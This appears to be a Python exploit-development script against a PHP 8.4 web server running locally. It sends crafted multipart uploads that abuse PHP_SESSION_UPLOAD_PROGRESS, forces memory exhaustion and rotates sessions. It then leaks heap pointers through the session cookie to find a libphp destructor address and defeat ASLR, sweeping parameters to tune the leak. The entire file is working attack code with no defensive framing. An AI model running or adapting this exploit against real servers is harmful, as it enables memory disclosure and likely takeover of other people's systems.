import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie

URL = "http://127.0.0.1:18112/index.php"
dtor_offset = 0x49ec50
SID = b"attacksessionid0001"
LIBBASE = 0x7a43d9480000
t = Target(URL, timeout=120, verbose=False)

def big(): return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def oom(nfields=1001):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

def leak(total, bump_t, bump_v):
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(total):
        cnt = bump_v if i == bump_t else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    return parse_cookie(resp)

def check(raw, label):
    if not raw:
        print(f"{label}: NO COOKIE"); return False
    ptrs = [int.from_bytes(raw[i:i+8], "little") for i in range(0, len(raw)-8, 8)]
    ptrs = [v for v in ptrs if 0x700000000000 <= v < 0x800000000000]
    dtor = any(v == LIBBASE + dtor_offset for v in ptrs)
    libptrs = [v for v in ptrs if 0x7a43d9480000 <= v < 0x7a43da000000]
    print(f"{label}: {len(raw)}B ptrs={len(ptrs)} libphp={len(libptrs)} DTOR={'HIT' if dtor else '-'}")
    return dtor

sweeps = [
    (983, 406, 16),   # 8.4.26 baseline
    (983, 300, 16),
    (983, 500, 16),
    (983, 700, 16),
    (983, 406, 8),
    (983, 406, 32),
    (1100, 406, 16),
    (850, 406, 16),
]
for total, bump_t, bump_v in sweeps:
    rotate()
    oom(1001)
    raw = leak(total, bump_t, bump_v)
    check(raw, f"total={total} t={bump_t} v={bump_v}")
